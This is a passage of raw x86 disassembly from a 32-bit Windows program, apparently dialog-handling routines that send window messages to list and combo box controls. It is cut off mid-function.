  404399:	mov    edi,edi
  40439b:	push   ebp
  40439c:	mov    ebp,esp
  40439e:	sub    esp,0xac
  4043a4:	mov    eax,ds:0x407a10
  4043a9:	xor    eax,ebp
  4043ab:	mov    DWORD PTR [ebp-0x4],eax
  4043ae:	push   esi
  4043af:	push   edi
  4043b0:	lea    eax,[ebp-0xac]
  4043b6:	push   eax
  4043b7:	push   DWORD PTR ds:0x408128
  4043bd:	call   DWORD PTR ds:0x40933c
  4043c3:	mov    eax,DWORD PTR [ebp-0xac]
  4043c9:	mov    DWORD PTR [ebp-0x98],eax
  4043cf:	mov    eax,DWORD PTR [ebp-0xa8]
  4043d5:	mov    DWORD PTR [ebp-0x90],eax
  4043db:	mov    eax,DWORD PTR [ebp-0xa4]
  4043e1:	mov    DWORD PTR [ebp-0x88],eax
  4043e7:	mov    eax,DWORD PTR [ebp-0xa0]
  4043ed:	mov    DWORD PTR [ebp-0x80],eax
  4043f0:	mov    eax,ds:0x40812c
  4043f5:	mov    DWORD PTR [ebp-0x78],eax
  4043f8:	mov    eax,ds:0x408130
  4043fd:	mov    DWORD PTR [ebp-0x70],eax
  404400:	mov    eax,ds:0x408138
  404405:	mov    DWORD PTR [ebp-0x68],eax
  404408:	mov    eax,ds:0x408104
  40440d:	push   DWORD PTR ds:0x408128
  404413:	mov    DWORD PTR [ebp-0x60],eax
  404416:	mov    eax,ds:0x408100
  40441b:	mov    DWORD PTR [ebp-0x58],eax
  40441e:	mov    eax,ds:0x408118
  404423:	mov    DWORD PTR [ebp-0x50],eax
  404426:	mov    eax,ds:0x408114
  40442b:	mov    DWORD PTR [ebp-0x48],eax
  40442e:	mov    eax,ds:0x408110
  404433:	mov    DWORD PTR [ebp-0x40],eax
  404436:	mov    eax,ds:0x40810c
  40443b:	mov    DWORD PTR [ebp-0x38],eax
  40443e:	mov    eax,ds:0x408108
  404443:	mov    DWORD PTR [ebp-0x30],eax
  404446:	mov    eax,ds:0x4080fc
  40444b:	mov    DWORD PTR [ebp-0x28],eax
  40444e:	mov    eax,ds:0x408134
  404453:	xor    esi,esi
  404455:	mov    edi,0x401a8c
  40445a:	mov    DWORD PTR [ebp-0x9c],edi
  404460:	mov    DWORD PTR [ebp-0x94],0x401a9c
  40446a:	mov    DWORD PTR [ebp-0x8c],0x401aa0
  404474:	mov    DWORD PTR [ebp-0x84],0x401aa8
  40447e:	mov    DWORD PTR [ebp-0x7c],0x401a7c
  404485:	mov    DWORD PTR [ebp-0x74],0x401a84
  40448c:	mov    DWORD PTR [ebp-0x6c],0x4019ec
  404493:	mov    DWORD PTR [ebp-0x64],0x401a30
  40449a:	mov    DWORD PTR [ebp-0x5c],0x401a3c
  4044a1:	mov    DWORD PTR [ebp-0x54],0x4019e0
  4044a8:	mov    DWORD PTR [ebp-0x4c],0x4019f8
  4044af:	mov    DWORD PTR [ebp-0x44],0x401a04
  4044b6:	mov    DWORD PTR [ebp-0x3c],0x401a14
  4044bd:	mov    DWORD PTR [ebp-0x34],0x401a24
  4044c4:	mov    DWORD PTR [ebp-0x2c],0x401a54
  4044cb:	mov    DWORD PTR [ebp-0x24],0x401a48
  4044d2:	mov    DWORD PTR [ebp-0x20],eax
  4044d5:	mov    DWORD PTR [ebp-0x1c],esi
  4044d8:	mov    DWORD PTR [ebp-0x18],esi
  4044db:	call   DWORD PTR ds:0x40938c
  4044e1:	mov    eax,esi
  4044e3:	push   DWORD PTR [ebp+eax*1-0x98]
  4044ea:	lea    eax,[ebp-0x14]
  4044ed:	push   0x401cf0
  4044f2:	push   0x10
  4044f4:	push   eax
  4044f5:	call   0x405110
  4044fa:	add    esp,0x10
  4044fd:	lea    eax,[ebp-0x14]
  404500:	push   eax
  404501:	push   edi
  404502:	push   0x407a00
  404507:	call   DWORD PTR ds:0x40928c
  40450d:	inc    esi
  40450e:	mov    eax,esi
  404510:	shl    eax,0x3
  404513:	mov    edi,DWORD PTR [ebp+eax*1-0x9c]
  40451a:	test   edi,edi
  40451c:	jne    0x4044e3
  40451e:	mov    ecx,DWORD PTR [ebp-0x4]
  404521:	pop    edi
  404522:	xor    ecx,ebp
  404524:	pop    esi
  404525:	call   0x405a3a
  40452a:	leave  
  40452b:	ret    
  40452c:	int3   
  40452d:	int3   
  40452e:	int3   
  40452f:	int3   
  404530:	int3   
  404531:	mov    edi,edi
  404533:	push   ebp
  404534:	mov    ebp,esp
  404536:	push   esi
  404537:	mov    esi,DWORD PTR ds:0x409370
  40453d:	push   0xfffffffe
  40453f:	push   0xfffffffd
  404541:	push   0xb1
  404546:	push   DWORD PTR ds:0x40811c
  40454c:	call   esi
  40454e:	push   DWORD PTR [ebp+0x8]
  404551:	push   0x0
  404553:	push   0xc2
  404558:	push   DWORD PTR ds:0x40811c
  40455e:	call   esi
  404560:	push   0x0
  404562:	push   0x0
  404564:	push   0xb7
  404569:	push   DWORD PTR ds:0x40811c
  40456f:	call   esi
  404571:	pop    esi
  404572:	pop    ebp
  404573:	ret    0x4
  404576:	int3   
  404577:	int3   
  404578:	int3   
  404579:	int3   
  40457a:	int3   
  40457b:	mov    edi,edi
  40457d:	push   ebp
  40457e:	mov    ebp,esp
  404580:	sub    esp,0x104
  404586:	mov    eax,ds:0x407a10
  40458b:	xor    eax,ebp
  40458d:	mov    DWORD PTR [ebp-0x4],eax
  404590:	push   esi
  404591:	lea    eax,[ebp+0xc]
  404594:	push   eax
  404595:	push   DWORD PTR [ebp+0x8]
  404598:	mov    esi,0x100
  40459d:	push   esi
  40459e:	lea    eax,[ebp-0x104]
  4045a4:	push   eax
  4045a5:	call   0x4050c7
  4045aa:	push   0x401f10
  4045af:	push   esi
  4045b0:	lea    eax,[ebp-0x104]
  4045b6:	push   eax
  4045b7:	call   0x40506d
  4045bc:	lea    eax,[ebp-0x104]
  4045c2:	push   eax
  4045c3:	call   0x404531
  4045c8:	mov    ecx,DWORD PTR [ebp-0x4]
  4045cb:	xor    ecx,ebp
  4045cd:	pop    esi
  4045ce:	call   0x405a3a
  4045d3:	leave  
  4045d4:	ret    
  4045d5:	int3   
  4045d6:	int3   
  4045d7:	int3   
  4045d8:	int3   
  4045d9:	int3   
  4045da:	mov    edi,edi
  4045dc:	push   ebp
  4045dd:	mov    ebp,esp
  4045df:	push   esi
  4045e0:	push   DWORD PTR [ebp+0x8]
  4045e3:	push   0x40
  4045e5:	call   DWORD PTR ds:0x4092a4
  4045eb:	mov    esi,eax
  4045ed:	test   esi,esi
  4045ef:	jne    0x4045fc
  4045f1:	push   0x401f14
  4045f6:	call   0x40457b
  4045fb:	pop    ecx
  4045fc:	mov    eax,esi
  4045fe:	pop    esi
  4045ff:	pop    ebp
  404600:	ret    0x4
  404603:	int3   
  404604:	int3   
  404605:	int3   
  404606:	int3   
  404607:	int3   
  404608:	mov    edi,edi
  40460a:	push   ebp
  40460b:	mov    ebp,esp
  40460d:	sub    esp,0x60
  404610:	mov    eax,ds:0x407a10
  404615:	xor    eax,ebp
  404617:	mov    DWORD PTR [ebp-0x4],eax
  40461a:	mov    ecx,DWORD PTR [ebp+0xc]
  40461d:	mov    eax,DWORD PTR [ebp+0x10]
  404620:	push   ebx
  404621:	mov    ebx,DWORD PTR [ebp+0x14]
  404624:	push   esi
  404625:	push   edi
  404626:	mov    edi,DWORD PTR [ebp+0x8]
  404629:	mov    DWORD PTR [ebp-0x58],edi
  40462c:	sub    ecx,0xf
  40462f:	je     0x404eea
  404635:	sub    ecx,0x101
  40463b:	je     0x404e1f
  404641:	dec    ecx
  404642:	je     0x404684
  404644:	sub    ecx,0x27
  404647:	je     0x40466b
  404649:	sub    ecx,0x2ff
  40464f:	jne    0x404f16
  404655:	push   0x407d80
  40465a:	push   DWORD PTR ds:0x407d70
  404660:	call   DWORD PTR ds:0x40932c
  404666:	jmp    0x404f16
  40466b:	push   0xc0c0c0
  404670:	push   eax
  404671:	call   DWORD PTR ds:0x409248
  404677:	push   0x1
  404679:	call   DWORD PTR ds:0x409250
  40467f:	jmp    0x404f18
  404684:	movzx  ebx,ax
  404687:	mov    ecx,ebx
  404689:	dec    ecx
  40468a:	je     0x404d50
  404690:	dec    ecx
  404691:	je     0x404db3
  404697:	sub    ecx,0x3e6
  40469d:	je     0x404a09
  4046a3:	dec    ecx
  4046a4:	je     0x404853
  4046aa:	sub    ecx,0x9
  4046ad:	jne    0x404f16
  4046b3:	shr    eax,0x10
  4046b6:	dec    eax
  4046b7:	je     0x404713
  4046b9:	sub    eax,0x4
  4046bc:	jne    0x404f16
  4046c2:	mov    ecx,DWORD PTR ds:0x407d7c
  4046c8:	mov    eax,ds:0x407d38
  4046cd:	mov    eax,DWORD PTR [eax+0xc]
  4046d0:	add    ecx,ecx
  4046d2:	cmp    DWORD PTR [eax+ecx*8+0x4],0x3
  4046d7:	jne    0x404f16
  4046dd:	push   0x20
  4046df:	lea    eax,[ebp-0x2c]
  4046e2:	push   eax
  4046e3:	push   DWORD PTR ds:0x407d70
  4046e9:	call   DWORD PTR ds:0x409330
  4046ef:	mov    ecx,DWORD PTR ds:0x407d7c
  4046f5:	lea    eax,[ebp-0x2c]
  4046f8:	push   eax
  4046f9:	mov    eax,ds:0x407d38
  4046fe:	mov    eax,DWORD PTR [eax+0xc]
  404701:	push   0x20
  404703:	add    ecx,ecx
  404705:	push   DWORD PTR [eax+ecx*8+0xc]
  404709:	call   0x405023
  40470e:	jmp    0x404f16
  404713:	mov    esi,DWORD PTR ds:0x409370
  404719:	xor    ebx,ebx
  40471b:	push   ebx
  40471c:	push   ebx
  40471d:	push   0x147
  404722:	push   DWORD PTR ds:0x407d70
  404728:	call   esi
  40472a:	mov    ecx,DWORD PTR ds:0x407d38
  404730:	mov    ecx,DWORD PTR [ecx+0xc]
  404733:	mov    edx,DWORD PTR ds:0x407d7c
  404739:	add    edx,edx
  40473b:	mov    DWORD PTR [ebp-0x8],ecx
  40473e:	mov    ecx,DWORD PTR [ecx+edx*8+0x4]
  404742:	dec    ecx
  404743:	dec    ecx
  404744:	je     0x40477e
  404746:	dec    ecx
  404747:	je     0x404768
  404749:	dec    ecx
  40474a:	jne    0x404f16
  404750:	push   0x401f90
  404755:	push   0x20
  404757:	push   0x407d80
  40475c:	call   0x405023
  404761:	push   ebx
  404762:	push   ebx
  404763:	jmp    0x404842
  404768:	cmp    eax,0x1
  40476b:	jne    0x404776
  40476d:	mov    eax,DWORD PTR [ebp-0x8]
  404770:	push   DWORD PTR [eax+edx*8+0xc]
  404774:	jmp    0x404755
  404776:	mov    BYTE PTR ds:0x407d80,bl
  40477c:	jmp    0x404761
  40477e:	xor    ebx,ebx
  404780:	test   eax,eax
  404782:	setne  bl
  404785:	push   0xffffffff
  404787:	push   ebx
  404788:	push   0x185
  40478d:	push   DWORD PTR ds:0x407d78
  404793:	call   esi
  404795:	test   ebx,ebx
  404797:	je     0x40482d
  40479d:	mov    ecx,DWORD PTR ds:0x407d7c
  4047a3:	mov    eax,ds:0x407d38
  4047a8:	mov    eax,DWORD PTR [eax+0xc]
  4047ab:	mov    ebx,DWORD PTR ds:0x409370
  4047b1:	xor    esi,esi
  4047b3:	push   esi
  4047b4:	push   esi
  4047b5:	add    ecx,ecx
  4047b7:	mov    eax,DWORD PTR [eax+ecx*8+0xc]
  4047bb:	push   0x190
  4047c0:	push   DWORD PTR ds:0x407d78
  4047c6:	mov    DWORD PTR [ebp-0x8],eax
  4047c9:	call   ebx
  4047cb:	mov    ecx,eax
  4047cd:	shl    ecx,0x2
  4047d0:	push   ecx
  4047d1:	mov    DWORD PTR [ebp-0x5c],eax
  4047d4:	call   0x4045da
  4047d9:	push   eax
  4047da:	push   DWORD PTR [ebp-0x5c]
  4047dd:	mov    DWORD PTR [ebp-0x50],eax
  4047e0:	push   0x191
  4047e5:	push   DWORD PTR ds:0x407d78
  4047eb:	call   ebx
  4047ed:	mov    edx,DWORD PTR [ebp-0x50]
  4047f0:	mov    ecx,esi
  4047f2:	mov    ebx,ecx
  4047f4:	cmp    DWORD PTR [ebp-0x5c],ecx
  4047f7:	jle    0x40480f
  4047f9:	mov    edi,DWORD PTR [ebp-0x5c]
  4047fc:	mov    esi,DWORD PTR [ebp-0x8]
  4047ff:	mov    eax,DWORD PTR [edx+ecx*4]
  404802:	or     ebx,DWORD PTR [esi+eax*8]
  404805:	inc    ecx
  404806:	cmp    ecx,edi
  404808:	jl     0x4047ff
  40480a:	mov    edi,DWORD PTR [ebp-0x58]
  40480d:	xor    esi,esi
  40480f:	push   edx
  404810:	call   DWORD PTR ds:0x40927c
  404816:	push   ebx
  404817:	push   0x401f64
  40481c:	push   0x20
  40481e:	push   0x407d80
  404823:	call   0x405110
  404828:	add    esp,0x10
  40482b:	jmp    0x404840
  40482d:	push   0x401f90
  404832:	push   0x20
  404834:	push   0x407d80
  404839:	call   0x405023
  40483e:	xor    esi,esi
  404840:	push   esi
  404841:	push   esi
  404842:	push   0x437
  404847:	push   edi
  404848:	call   DWORD PTR ds:0x409374
  40484e:	jmp    0x404f16
  404853:	xor    ecx,ecx
  404855:	shr    eax,0x10
  404858:	inc    ecx
  404859:	cmp    ax,cx
  40485c:	jne    0x404f16
  404862:	xor    ebx,ebx
  404864:	push   ebx
  404865:	push   ebx
  404866:	push   0x190
  40486b:	push   DWORD PTR ds:0x407d78
  404871:	call   DWORD PTR ds:0x409370
  404877:	mov    edx,DWORD PTR ds:0x407d7c
  40487d:	mov    ecx,DWORD PTR ds:0x407d38
  404883:	mov    ecx,DWORD PTR [ecx+0xc]
  404886:	add    edx,edx
  404888:	mov    ecx,DWORD PTR [ecx+edx*8+0xc]
  40488c:	mov    DWORD PTR [ebp-0x58],ecx
  40488f:	mov    ecx,eax
  404891:	shl    ecx,0x2
  404894:	mov    esi,ebx
  404896:	push   ecx
  404897:	mov    DWORD PTR [ebp-0x54],eax
  40489a:	mov    DWORD PTR [ebp-0x5c],esi
  40489d:	call   0x4045da
  4048a2:	push   eax
  4048a3:	push   DWORD PTR [ebp-0x54]
  4048a6:	mov    DWORD PTR [ebp-0x50],eax
  4048a9:	push   0x191
  4048ae:	push   DWORD PTR ds:0x407d78
  4048b4:	call   DWORD PTR ds:0x409370
  4048ba:	mov    edx,DWORD PTR ds:0x407d7c
  4048c0:	mov    ecx,DWORD PTR ds:0x407d38
  4048c6:	mov    ecx,DWORD PTR [ecx+0xc]
  4048c9:	add    edx,edx
  4048cb:	cmp    DWORD PTR [ecx+edx*8+0x4],0x2
  4048d0:	jne    0x4048ec
  4048d2:	mov    ecx,DWORD PTR [ebp-0x54]
  4048d5:	mov    edi,DWORD PTR [ebp-0x50]
  4048d8:	test   ecx,ecx
  4048da:	jle    0x404959
  4048dc:	mov    edx,DWORD PTR [ebp-0x58]
  4048df:	mov    eax,DWORD PTR [edi+ebx*4]
  4048e2:	or     esi,DWORD PTR [edx+eax*8]
  4048e5:	inc    ebx
  4048e6:	cmp    ebx,ecx
  4048e8:	jl     0x4048df
  4048ea:	jmp    0x404959
  4048ec:	mov    eax,DWORD PTR [ebp-0x54]
  4048ef:	cmp    eax,0x1
  4048f2:	jne    0x404901
  4048f4:	mov    edi,DWORD PTR [ebp-0x50]
  4048f7:	mov    eax,DWORD PTR [edi]
  4048f9:	mov    edx,DWORD PTR [ebp-0x58]
  4048fc:	mov    esi,DWORD PTR [edx+eax*8]
  4048ff:	jmp    0x404959
  404901:	cmp    eax,0x2
  404904:	jne    0x404996
  40490a:	push   0x10
  40490c:	lea    eax,[ebp-0x1c]
  40490f:	push   eax
  404910:	push   DWORD PTR ds:0x407d70
  404916:	call   DWORD PTR ds:0x409330
  40491c:	lea    eax,[ebp-0x5c]
  40491f:	push   eax
  404920:	lea    eax,[ebp-0x1c]
  404923:	push   eax
  404924:	call   0x405582
  404929:	test   eax,eax
  40492b:	je     0x404956
  40492d:	mov    esi,DWORD PTR [ebp-0x50]
  404930:	mov    ecx,DWORD PTR [esi]
  404932:	mov    edi,DWORD PTR [ebp-0x58]
  404935:	mov    eax,DWORD PTR [edi+ecx*8]
  404938:	cmp    eax,DWORD PTR [ebp-0x5c]
  40493b:	jne    0x40497d
  40493d:	push   ecx
  40493e:	push   ebx
  40493f:	push   0x185
  404944:	push   DWORD PTR ds:0x407d78
  40494a:	call   DWORD PTR ds:0x409370
  404950:	mov    eax,DWORD PTR [esi+0x4]
  404953:	mov    esi,DWORD PTR [edi+eax*8]
  404956:	mov    edi,DWORD PTR [ebp-0x50]
  404959:	push   edi
  40495a:	call   DWORD PTR ds:0x40927c
  404960:	push   esi
  404961:	push   0x401f64
  404966:	lea    eax,[ebp-0x1c]
  404969:	push   0x10
  40496b:	push   eax
  40496c:	call   0x405110
  404971:	add    esp,0x10
  404974:	lea    eax,[ebp-0x1c]
  404977:	push   eax
  404978:	jmp    0x40465a
  40497d:	push   DWORD PTR [esi+0x4]
  404980:	push   ebx
  404981:	push   0x185
  404986:	push   DWORD PTR ds:0x407d78
  40498c:	call   DWORD PTR ds:0x409370
  404992:	mov    eax,DWORD PTR [esi]
  404994:	jmp    0x404953
  404996:	jle    0x404956
  404998:	push   0x10
  40499a:	lea    eax,[ebp-0x1c]
  40499d:	push   eax
  40499e:	push   0x3f2
  4049a3:	push   edi
  4049a4:	call   DWORD PTR ds:0x409384
  4049aa:	lea    eax,[ebp-0x5c]
  4049ad:	push   eax
  4049ae:	lea    eax,[ebp-0x1c]
  4049b1:	push   eax
  4049b2:	call   0x405582
  4049b7:	mov    edi,DWORD PTR [ebp-0x50]
  4049ba:	test   eax,eax
  4049bc:	je     0x404959
  4049be:	mov    eax,DWORD PTR [ebp-0x54]
  4049c1:	mov    esi,DWORD PTR [ebp-0x5c]
  4049c4:	mov    edx,ebx
  4049c6:	mov    DWORD PTR [ebp-0x8],edx
  4049c9:	test   eax,eax
  4049cb:	jle    0x404959
  4049cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4049d0:	mov    eax,DWORD PTR [edi+edx*4]
  4049d3:	cmp    DWORD PTR [ecx+eax*8],esi
  4049d6:	mov    DWORD PTR [ebp-0x5c],eax
  4049d9:	mov    eax,DWORD PTR [ebp-0x54]
  4049dc:	je     0x4049fc
  4049de:	push   DWORD PTR [ebp-0x5c]
  4049e1:	push   ebx
  4049e2:	push   0x185
  4049e7:	push   DWORD PTR ds:0x407d78
  4049ed:	call   DWORD PTR ds:0x409370
  4049f3:	mov    eax,DWORD PTR [ebp-0x54]
  4049f6:	mov    ecx,DWORD PTR [ebp-0x58]
  4049f9:	mov    edx,DWORD PTR [ebp-0x8]
  4049fc:	inc    edx
  4049fd:	mov    DWORD PTR [ebp-0x8],edx
  404a00:	cmp    edx,eax
  404a02:	jl     0x4049d0
  404a04:	jmp    0x404959
  404a09:	xor    ecx,ecx
  404a0b:	shr    eax,0x10
  404a0e:	inc    ecx
  404a0f:	cmp    ax,cx
  404a12:	jne    0x404f16
  404a18:	mov    al,ds:0x40117c
  404a1d:	push   0x7
  404a1f:	mov    BYTE PTR [ebp-0x2c],al
  404a22:	pop    ecx
  404a23:	xor    eax,eax
  404a25:	lea    edi,[ebp-0x2b]
  404a28:	rep stos DWORD PTR es:[edi],eax
  404a2a:	xor    ebx,ebx
  404a2c:	push   ebx
  404a2d:	stos   WORD PTR es:[edi],ax
  404a2f:	push   ebx
  404a30:	push   0x188
  404a35:	push   DWORD PTR ds:0x407d74
  404a3b:	stos   BYTE PTR es:[edi],al
  404a3c:	mov    edi,DWORD PTR ds:0x409370
  404a42:	call   edi
  404a44:	or     esi,0xffffffff
  404a47:	mov    DWORD PTR [ebp-0x54],eax
  404a4a:	cmp    DWORD PTR ds:0x407d7c,esi
  404a50:	je     0x404ab5
  404a52:	push   0x1f
  404a54:	lea    eax,[ebp-0x2c]
  404a57:	push   eax
  404a58:	push   DWORD PTR ds:0x407d70
  404a5e:	call   DWORD PTR ds:0x409330
  404a64:	mov    eax,ds:0x407d38
  404a69:	mov    ecx,DWORD PTR ds:0x407d7c
  404a6f:	mov    edx,DWORD PTR [eax+0xc]
  404a72:	shl    ecx,0x4
  404a75:	mov    eax,DWORD PTR [ecx+edx*1+0x4]
  404a79:	mov    DWORD PTR [ebp-0x8],ecx
  404a7c:	test   eax,eax
  404a7e:	je     0x404ab5
  404a80:	cmp    eax,0x2
  404a83:	jbe    0x404a93
  404a85:	cmp    eax,0x3
  404a88:	je     0x404b6a
  404a8e:	cmp    eax,0x4
  404a91:	jne    0x404ab5
  404a93:	lea    eax,[edx+0x8]
  404a96:	add    eax,ecx
  404a98:	push   eax
  404a99:	lea    eax,[ebp-0x2c]
  404a9c:	push   eax
  404a9d:	call   0x405582
  404aa2:	test   eax,eax
  404aa4:	jne    0x404ab5
  404aa6:	mov    eax,ds:0x407d38
  404aab:	mov    eax,DWORD PTR [eax+0xc]
  404aae:	mov    ecx,DWORD PTR [ebp-0x8]
  404ab1:	mov    DWORD PTR [ecx+eax*1+0x8],ebx
  404ab5:	push   ebx
  404ab6:	push   ebx
  404ab7:	push   0x184
  404abc:	push   DWORD PTR ds:0x407d78
  404ac2:	call   edi
  404ac4:	push   ebx
  404ac5:	push   ebx
  404ac6:	push   0x14b
  404acb:	push   DWORD PTR ds:0x407d70
  404ad1:	call   edi
  404ad3:	mov    eax,ds:0x407d38
  404ad8:	mov    ecx,DWORD PTR [ebp-0x54]
  404adb:	mov    edx,DWORD PTR [eax+0xc]
  404ade:	shl    ecx,0x4
  404ae1:	mov    eax,DWORD PTR [edx+ecx*1+0x4]
  404ae5:	mov    DWORD PTR [ebp-0x50],ecx
  404ae8:	dec    eax
  404ae9:	je     0x404cb9
  404aef:	dec    eax
  404af0:	je     0x404c2e
  404af6:	dec    eax
  404af7:	je     0x404bcf
  404afd:	dec    eax
  404afe:	jne    0x404d33
  404b04:	mov    eax,DWORD PTR [edx+ecx*1+0xc]
  404b08:	mov    DWORD PTR [ebp-0x5c],eax
  404b0b:	cmp    DWORD PTR [eax],esi
  404b0d:	je     0x404b5a
  404b0f:	mov    DWORD PTR [ebp-0x8],eax
  404b12:	push   DWORD PTR [eax+0x4]
  404b15:	push   esi
  404b16:	push   0x181
  404b1b:	push   DWORD PTR ds:0x407d78
  404b21:	call   edi
  404b23:	mov    eax,ds:0x407d38
  404b28:	mov    ecx,DWORD PTR [ebp-0x50]
  404b2b:	mov    eax,DWORD PTR [eax+0xc]
  404b2e:	mov    eax,DWORD PTR [eax+ecx*1+0x8]
  404b32:	mov    ecx,DWORD PTR [ebp-0x8]
  404b35:	cmp    eax,DWORD PTR [ecx]
  404b37:	jne    0x404b4c
  404b39:	movzx  eax,bx
  404b3c:	push   eax
  404b3d:	push   0x1
  404b3f:	push   0x185
  404b44:	push   DWORD PTR ds:0x407d78
  404b4a:	call   edi
  404b4c:	mov    eax,DWORD PTR [ebp-0x5c]
  404b4f:	inc    ebx
  404b50:	lea    eax,[eax+ebx*8]
  404b53:	mov    DWORD PTR [ebp-0x8],eax
  404b56:	cmp    DWORD PTR [eax],esi
  404b58:	jne    0x404b12
  404b5a:	push   0x401f78
  404b5f:	push   esi
  404b60:	push   0x14a
  404b65:	jmp    0x404d09
  404b6a:	push   ebx
  404b6b:	push   ebx
  404b6c:	push   0x147
  404b71:	push   DWORD PTR ds:0x407d70
  404b77:	call   edi
  404b79:	test   eax,eax
  404b7b:	jne    0x404b96
  404b7d:	mov    ecx,DWORD PTR ds:0x407d7c
  404b83:	mov    eax,ds:0x407d38
  404b88:	mov    eax,DWORD PTR [eax+0xc]
  404b8b:	add    ecx,ecx
  404b8d:	mov    DWORD PTR [eax+ecx*8+0x8],ebx
  404b91:	jmp    0x404ab5
  404b96:	mov    esi,DWORD PTR ds:0x407d38
  404b9c:	mov    edi,DWORD PTR ds:0x407d7c
  404ba2:	lea    eax,[ebp-0x2c]
  404ba5:	push   eax
  404ba6:	mov    eax,DWORD PTR [esi+0xc]
  404ba9:	push   0x20
  404bab:	add    edi,edi
  404bad:	push   DWORD PTR [eax+edi*8+0xc]
  404bb1:	call   0x405023
  404bb6:	mov    ecx,DWORD PTR [esi+0xc]
  404bb9:	mov    eax,DWORD PTR [ecx+edi*8+0xc]
  404bbd:	mov    DWORD PTR [ecx+edi*8+0x8],eax
  404bc1:	mov    edi,DWORD PTR ds:0x409370
  404bc7:	or     esi,0xffffffff
  404bca:	jmp    0x404ab5
  404bcf:	mov    DWORD PTR [ebp-0x60],0x401f38
  404bd6:	mov    DWORD PTR [ebp-0x5c],0x401f4c
  404bdd:	push   DWORD PTR [ebp+ebx*4-0x60]
  404be1:	push   esi
  404be2:	push   0x14a
  404be7:	push   DWORD PTR ds:0x407d70
  404bed:	call   edi
  404bef:	inc    ebx
  404bf0:	cmp    ebx,0x2
  404bf3:	jb     0x404bdd
  404bf5:	mov    eax,ds:0x407d38
  404bfa:	mov    eax,DWORD PTR [eax+0xc]
  404bfd:	mov    ecx,DWORD PTR [ebp-0x50]
  404c00:	mov    eax,DWORD PTR [eax+ecx*1+0x8]
  404c04:	push   0x0
  404c06:	pop    ebx
  404c07:	test   eax,eax
  404c09:	jne    0x404c15
  404c0b:	mov    eax,ebx
  404c0d:	mov    BYTE PTR [ebp-0x2c],bl
  404c10:	lea    esi,[ebp-0x2c]
  404c13:	jmp    0x404c1a
  404c15:	mov    esi,eax
  404c17:	xor    eax,eax
  404c19:	inc    eax
  404c1a:	push   ebx
  404c1b:	push   eax
  404c1c:	push   0x14e
  404c21:	push   DWORD PTR ds:0x407d70
  404c27:	call   edi
  404c29:	jmp    0x404d36
  404c2e:	push   0x3e9
  404c33:	push   DWORD PTR [ebp-0x58]
  404c36:	call   DWORD PTR ds:0x40939c
  404c3c:	mov    ecx,DWORD PTR ds:0x407d38
  404c42:	mov    ecx,DWORD PTR [ecx+0xc]
  404c45:	mov    edx,eax
  404c47:	mov    eax,DWORD PTR [ebp-0x50]
  404c4a:	mov    eax,DWORD PTR [ecx+eax*1+0xc]
  404c4e:	mov    DWORD PTR [ebp-0x5c],edx
  404c51:	mov    DWORD PTR [ebp-0x58],eax
  404c54:	cmp    DWORD PTR [eax],esi
  404c56:	je     0x404c9e
  404c58:	mov    DWORD PTR [ebp-0x8],eax
  404c5b:	push   DWORD PTR [eax+0x4]
  404c5e:	push   esi
  404c5f:	push   0x181
  404c64:	push   edx
  404c65:	call   edi
  404c67:	mov    eax,ds:0x407d38
  404c6c:	mov    ecx,DWORD PTR [ebp-0x50]
  404c6f:	mov    eax,DWORD PTR [eax+0xc]
  404c72:	mov    eax,DWORD PTR [eax+ecx*1+0x8]
  404c76:	mov    ecx,DWORD PTR [ebp-0x8]
  404c79:	test   DWORD PTR [ecx],eax
  404c7b:	je     0x404c8d
  404c7d:	movzx  eax,bx
  404c80:	push   eax
  404c81:	push   0x1
  404c83:	push   0x185
  404c88:	push   DWORD PTR [ebp-0x5c]
  404c8b:	call   edi
  404c8d:	mov    eax,DWORD PTR [ebp-0x58]
  404c90:	mov    edx,DWORD PTR [ebp-0x5c]
  404c93:	inc    ebx
  404c94:	lea    eax,[eax+ebx*8]
  404c97:	mov    DWORD PTR [ebp-0x8],eax
  404c9a:	cmp    DWORD PTR [eax],esi
  404c9c:	jne    0x404c5b
  404c9e:	push   0x401f78
  404ca3:	push   esi
  404ca4:	mov    ebx,0x14a
  404ca9:	push   ebx
  404caa:	push   DWORD PTR ds:0x407d70
  404cb0:	call   edi
  404cb2:	push   0x401f84
  404cb7:	jmp    0x404d07
  404cb9:	push   0x401f5c
  404cbe:	push   esi
  404cbf:	mov    ebx,0x14a
  404cc4:	push   ebx
  404cc5:	push   DWORD PTR ds:0x407d70
  404ccb:	call   edi
  404ccd:	mov    eax,ds:0x407d38
  404cd2:	mov    eax,DWORD PTR [eax+0xc]
  404cd5:	mov    ecx,DWORD PTR [ebp-0x50]
  404cd8:	mov    eax,DWORD PTR [eax+ecx*1+0xc]
  404cdc:	test   eax,eax
  404cde:	je     0x404d02
  404ce0:	push   eax
  404ce1:	push   0x401f64
  404ce6:	lea    eax,[ebp-0x2c]
  404ce9:	push   0x20
  404ceb:	push   eax
  404cec:	call   0x405110
  404cf1:	add    esp,0x10
  404cf4:	lea    eax,[ebp-0x2c]
  404cf7:	push   eax
  404cf8:	push   esi
  404cf9:	push   ebx
  404cfa:	push   DWORD PTR ds:0x407d70
  404d00:	call   edi
  404d02:	push   0x401f6c
  404d07:	push   esi
  404d08:	push   ebx
  404d09:	push   DWORD PTR ds:0x407d70
  404d0f:	call   edi
  404d11:	mov    eax,ds:0x407d38
  404d16:	mov    eax,DWORD PTR [eax+0xc]
  404d19:	mov    ecx,DWORD PTR [ebp-0x50]
  404d1c:	push   DWORD PTR [eax+ecx*1+0x8]
  404d20:	lea    eax,[ebp-0x2c]
  404d23:	push   0x401f64
  404d28:	push   0x20
  404d2a:	push   eax
  404d2b:	call   0x405110
  404d30:	add    esp,0x10
  404d33:	lea    esi,[ebp-0x2c]
  404d36:	push   esi
  404d37:	push   DWORD PTR ds:0x407d70
  404d3d:	call   DWORD PTR ds:0x40932c
  404d43:	mov    eax,DWORD PTR [ebp-0x54]
  404d46:	mov    ds:0x407d7c,eax
  404d4b:	jmp    0x404f16
  404d50:	cmp    DWORD PTR ds:0x407d7c,0xffffffff
  404d57:	je     0x404db3
  404d59:	push   0x1f
  404d5b:	lea    eax,[ebp-0x2c]
  404d5e:	push   eax
  404d5f:	push   0x3f2
  404d64:	push   edi
  404d65:	call   DWORD PTR ds:0x409384
  404d6b:	mov    eax,ds:0x407d38
  404d70:	mov    esi,DWORD PTR ds:0x407d7c
  404d76:	mov    ecx,DWORD PTR [eax+0xc]
  404d79:	shl    esi,0x4
  404d7c:	mov    eax,DWORD PTR [esi+ecx*1+0x4]
  404d80:	test   eax,eax
  404d82:	je     0x404db3
  404d84:	cmp    eax,0x2
